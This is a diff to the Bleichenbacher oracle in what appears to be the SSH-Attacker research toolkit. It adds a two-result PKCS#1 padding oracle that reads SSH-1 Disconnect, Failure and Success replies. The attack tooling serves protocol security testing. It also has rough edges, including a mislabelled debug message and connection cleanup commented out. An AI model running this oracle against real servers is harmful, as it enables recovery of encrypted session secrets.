@@ -15,10 +15,15 @@ import de.rub.nds.sshattacker.attacks.response.ResponseFingerprint;
 import de.rub.nds.sshattacker.core.config.Config;
 import de.rub.nds.sshattacker.core.crypto.keys.CustomRsaPublicKey;
 import de.rub.nds.sshattacker.core.exceptions.WorkflowExecutionException;
+import de.rub.nds.sshattacker.core.protocol.common.ProtocolMessage;
+import de.rub.nds.sshattacker.core.protocol.ssh1.message.DisconnectMessageSSH1;
+import de.rub.nds.sshattacker.core.protocol.ssh1.message.FailureMessageSSH1;
+import de.rub.nds.sshattacker.core.protocol.ssh1.message.SuccessMessageSSH1;
 import de.rub.nds.sshattacker.core.state.State;
 import de.rub.nds.sshattacker.core.workflow.DefaultWorkflowExecutor;
 import de.rub.nds.sshattacker.core.workflow.WorkflowExecutor;
 import de.rub.nds.sshattacker.core.workflow.WorkflowTrace;
+import de.rub.nds.sshattacker.core.workflow.action.GenericReceiveAction;
 import de.rub.nds.tlsattacker.util.MathHelper;
 import java.io.IOException;
 import java.security.interfaces.RSAPublicKey;
@@ -37,6 +42,8 @@ public class BleichenbacherOracle extends Pkcs1Oracle {
 
     private final int maxAttempts;
 
+    private int counter;
+
     /**
      * @param hostPublicKey The public key
      * @param config Config
@@ -49,6 +56,7 @@ public class BleichenbacherOracle extends Pkcs1Oracle {
                 MathHelper.intCeilDiv(this.hostPublicKey.getModulus().bitLength(), Byte.SIZE);
         this.config = config;
         this.maxAttempts = 10;
+        counter = 0;
     }
 
     /**
@@ -69,22 +77,25 @@ public class BleichenbacherOracle extends Pkcs1Oracle {
 
     @Override
     public boolean checkPKCSConformity(final byte[] msg) {
-        return checkPKCSConformity(msg, 0);
+        return checkPKCSConformity(msg, 0)[0];
     }
 
     @Override
     public boolean[] checkDoublePKCSConformity(final byte[] msg) {
 
-        checkPKCSConformity(msg);
-        return new boolean[] {false, false};
+        return checkPKCSConformity(msg, 0);
     }
 
-    private boolean checkPKCSConformity(final byte[] msg, int currentAttempt) {
+    private boolean[] checkPKCSConformity(final byte[] msg, int currentAttempt) {
         // we are initializing a new connection in every loop step, since most
         // of the known servers close the connection after an invalid handshake
         Config sshConfig = config;
         sshConfig.setWorkflowExecutorShouldClose(false);
         WorkflowTrace trace = BleichenbacherWorkflowGenerator.generateWorkflow(sshConfig, msg);
+
+        GenericReceiveAction receiveOracleResultAction = new GenericReceiveAction();
+        trace.addSshAction(receiveOracleResultAction);
+
         State state = new State(sshConfig, trace);
         WorkflowExecutor workflowExecutor = new DefaultWorkflowExecutor(state);
 
@@ -93,14 +104,34 @@ public class BleichenbacherOracle extends Pkcs1Oracle {
             CONSOLE.info("Number of queries so far: {}", numberOfQueries);
         }
 
-        boolean conform = false;
+        boolean conform[] = {false, false};
         try {
             workflowExecutor.executeWorkflow();
+
+            ProtocolMessage<?> lastMessage = receiveOracleResultAction.getReceivedMessages().get(0);
+            LOGGER.debug("Received: {}", lastMessage.toString());
+
+            if (lastMessage instanceof DisconnectMessageSSH1) {
+                LOGGER.debug("Received Disconnected Message -> nothing was correct .... :(");
+            } else if (lastMessage instanceof FailureMessageSSH1) {
+                LOGGER.debug("Received Failure Message -> the first one was correct :|");
+                conform[0] = true;
+            } else if (lastMessage instanceof SuccessMessageSSH1) {
+                LOGGER.debug("Received Failure Message -> both were correct :)");
+                conform[0] = true;
+                conform[1] = true;
+            } else {
+                LOGGER.fatal("Something gone wrong with the preconfigured oracle....");
+            }
+
+            LOGGER.fatal("Attempt {}", counter);
+            counter++;
+
             if (!trace.executedAsPlanned()) {
                 // Something did not execute as planned, the result may be either way
                 throw new WorkflowExecutionException("Workflow did not execute as planned!");
             }
-            clearConnections(state);
+            // clearConnections(state);
 
         } catch (WorkflowExecutionException e) {
             // If workflow execution failed, retry. This might be because a packet got lost
